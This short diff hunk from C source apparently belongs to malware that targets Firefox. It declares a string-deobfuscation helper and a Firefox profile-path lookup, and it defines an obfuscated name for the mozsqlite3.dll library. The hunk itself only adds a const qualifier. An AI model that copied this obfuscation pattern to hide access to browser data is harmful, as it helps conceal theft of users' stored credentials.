@@ -20,7 +20,7 @@ extern int DirectoryExists(WCHAR *path);
 extern char *HM_CompletePath(char *file_name, char *buffer);
 extern char *GetDosAsciiName(WCHAR *orig_path);
 extern WCHAR *GetFFProfilePath(WCHAR *, size_t);
-extern char *DeobStringA(char *string);
+extern char *DeobStringA(const char *string);
 extern void FireFoxInitFunc();
 
 #define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
